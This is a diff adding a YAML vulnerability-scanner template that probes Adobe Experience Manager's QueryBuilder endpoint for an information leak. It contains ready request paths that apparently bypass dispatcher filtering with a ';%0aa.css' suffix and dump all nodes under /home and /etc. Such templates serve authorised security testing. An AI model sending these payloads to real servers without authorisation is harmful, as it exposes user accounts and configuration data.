@@ -1,0 +1,23 @@
+id: poc-yaml-aem-querybuilder-internal-path-info-leak
+info:
+  name: AEM QueryBuilder 内部路径信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: AEM
+  osprey-id: vb_2022_0039
+variables:
+  v_path: 'str("/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1")
+
+    str("/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1")
+
+    str("/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1")
+
+    str("/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1")'
+requests:
+- method: GET
+  expression: 'contains(body, "jcr:path") && contains(body, "{\"success\":true,\"results\"")
+
+    '
+  paths: '{{.v_path}}'
+transport: http
